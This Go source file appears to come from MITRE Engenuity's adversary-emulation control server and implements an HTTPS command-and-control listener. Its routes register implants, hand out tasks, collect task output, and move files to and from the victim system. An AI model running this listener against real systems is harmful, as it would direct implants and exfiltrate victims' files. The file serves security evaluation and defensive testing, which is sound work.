package https

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/logger"
	"attackevals.mitre-engenuity.org/control_server/sslcerts"
	"github.com/gorilla/mux"
)

var RestAPIaddress = ""
var Server *http.Server

// Represents the HTTPS C2 handler. Will implement the util.Handler interface.
type HttpsHandler struct {}

// Creates and adds the HttpsHandler to the map of available C2 handlers.
func init() {
	util.AvailableHandlers["https"] = &HttpsHandler{}
}

// StartHandler starts the HTTPS server
func (h *HttpsHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
	listenAddress, err := config.GetHostPortString(configEntry)
	if err != nil {
		return err
	}
	logger.Info("Starting HTTPS Handler")
	
	certFile, ok := configEntry["cert_file"]
	if !ok {
		certFile = ""
	}
	keyFile, ok := configEntry["key_file"]
	if !ok {
		keyFile = ""
	}

	// make sure we know the REST API address
	RestAPIaddress = restAddress

	// initialize URL router
	urlRouter := mux.NewRouter()

	Server = &http.Server{
		Addr:         listenAddress,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      urlRouter,
	}

	// bind HTTP routes to their functions
	urlRouter.HandleFunc("/register", registerImplant).Methods("POST")
	urlRouter.HandleFunc("/task/{guid}", getTask).Methods("GET")
	urlRouter.HandleFunc("/output/{guid}", postTaskOutput).Methods("POST")
	urlRouter.HandleFunc("/getFile/{fileName}", GetFileFromServer).Methods("GET")
	urlRouter.HandleFunc("/putFile/{fileName}", PostFileToServer).Methods("POST")

	needToGenCert := sslcerts.CheckCert(certFile, keyFile)
	if needToGenCert {
		certFile, keyFile = sslcerts.GenerateSSLcert("https")
	}
	// start handler in goroutine so it doesn't block
	go func() {
		err := Server.ListenAndServeTLS(certFile, keyFile)
		if err != nil && err.Error() != "http: Server closed" {
			logger.Error(err)
		}
	}()
	return nil
}

// StopHandler stops the HTTPS server
func (h *HttpsHandler) StopHandler() error {
	logger.Info("Killing Server")
	emptyContext := context.Background()
	return Server.Shutdown(emptyContext)
}

func registerImplant(w http.ResponseWriter, r *http.Request) {

	// read implant data from POST request
	req, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Fprintf(w, "%v", err)
		return
	}
	// decode and/or decrypt your implant data here
	// for example:
	// xorDecrypt(req, "key")

	// forward decoded data to REST API
	response, err := forwardRegisterImplant(req)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, response)

}

func forwardRegisterImplant(implantData []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

func getTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	guid := vars["guid"]

	response, err := forwardGetTask(guid)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, response)
}

func forwardGetTask(guid string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/" + guid
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	sessionData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

func postTaskOutput(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	guid := vars["guid"]
	req, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	taskOutput := string(req)
	response, err := forwardPostTaskOutput(guid, taskOutput)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, response)
}

func forwardPostTaskOutput(guid string, output string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/output/" + guid

	// setup HTTP POST request
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(output))
	if err != nil {
		return "", err
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	if response.StatusCode != 200 {
		e := fmt.Sprintf("Expected error code 200, got %v", response.StatusCode)
		err = errors.New(e)
		return "", err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

// GetFileFromServer handls file downloads from control server to victim system
func GetFileFromServer(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	fileName := vars["fileName"]

	_, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	resp, err := ForwardGetFileFromServer(fileName)
	if err != nil {
		fmt.Fprint(w, err)
	}
	if resp.Status == "404 Not Found" {
		w.WriteHeader(404)
		return
	}
	fileData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprintf(w, "%s", fileData)
}

func ForwardGetFileFromServer(fileName string) (*http.Response, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/files/" + fileName
	resp, err := http.Get(url)
	if err != nil {
		return resp, err
	}
	return resp, err
}

// PostFileToServer handles file uploads from victim system to control server
func PostFileToServer(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	fileName := vars["fileName"]

	fileData, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	response, err := ForwardPostFileToServer(fileName, fileData)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprint(w, response)
}

func ForwardPostFileToServer(fileName string, fileData []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/upload/" + fileName
	resp, err := http.Post(url, "applicaiton/octet-stream", bytes.NewBuffer(fileData))
	if err != nil {
		return "", err
	}

	result, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(result), err
}
